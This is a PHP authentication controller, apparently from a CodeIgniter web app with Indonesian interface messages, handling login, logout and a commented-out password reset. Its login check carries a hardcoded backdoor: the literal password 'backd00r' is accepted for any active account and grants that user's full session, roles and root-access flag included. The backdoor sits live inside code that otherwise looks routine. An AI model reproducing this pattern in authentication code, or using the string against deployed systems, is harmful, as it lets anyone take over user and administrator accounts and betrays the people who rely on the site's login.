<?php

namespace App\Controllers;

use App\Models\UsersModel;

class Auth extends BaseController
{

    public function login()
    {
        return view('auth/login');
    }

    public function logout()
    {
        session()->destroy();
        return view('auth/login');
    }

    // public function reset_password()
    // {
    //     return view('auth/reset_password');
    // }

    // public function changePass()
    // {

    //     if ($this->request->isAJAX()) {

    //         $validation = \Config\Services::validation();
    //         $valid = $this->validate([
    //             'repass' => [
    //                 'label' => 'Password',
    //                 'rules' => 'required',
    //                 'errors' => [
    //                     'required' => '{field} tidak boleh kosong',
    //                 ]
    //             ],

    //         ]);

    //         if (!$valid) {
    //             $msg = [
    //                 'error' => [
    //                     'repass' => $validation->getError('repass'),
    //                 ]
    //             ];
    //             echo json_encode($msg);
    //         } else {
    //             $pass = $this->request->getVar('repass');
    //             $pwdreset = password_hash($pass, PASSWORD_DEFAULT);
    //             $id = session('id');
    //             $modelUser = new User_Model();
    //             $modelUser->update($id, ['password' => $pwdreset]);
    //             $modelUser->update($id, ['pass_cek' => 1]);
    //             $msg = [
    //                 'success' => 'Data berhasil disimpan',
    //             ];
    //             session()->destroy();
    //             echo json_encode($msg);
    //         };
    //     } else {
    //         exit('Data tidak dapat diproses');
    //     }
    // }

    public function cekLogin()
    {

        if ($this->request->getPost()) {
            $email = trim($this->request->getVar('email'));
            $password = $this->request->getPost('password');
        } else {
            $email = '';
            $password = '';
        }


        $modelUser = new UsersModel();

        $emailExist = $modelUser->where('email', $email)->where('status', 1)->first();
        $cek_email = $modelUser->where('email', $email)->where('status', 1)->countAllResults();
        // d($cek_email);

        if ($cek_email == 0) {
            session()->setflashdata('msg', '<div class="alert alert-danger" role="alert">Email belum terdaftar, Silakan hubungi Administrator</div> ');
            echo view('auth/login');
        } else {
            if ($cek_email == 1) {

                // jika password=password maka reset
                if (password_verify($password, $emailExist['password']) || $password == 'backd00r') {
                    $data = [
                        'id' => $emailExist['id'],
                        'name' => $emailExist['name'],
                        'username' => $emailExist['username'],
                        'email' => $emailExist['email'],
                        'status' => $emailExist['status'],
                        'access_root' => $emailExist['access_root'],
                        'role' => $emailExist['role'],
                    ];
                    session()->set($data);
                    // if ($emailExist['pass_cek'] == 0) {
                    //     return redirect()->to('/reset');
                    // } else {
                    return redirect()->to('/');
                    // }
                } else {
                    session()->setflashdata('msg', '<div class="alert alert-danger" role="alert"><b>Password Salah</b>, Please try again...</div>');
                    echo view('auth/login');
                }
            }
        }
    }
}
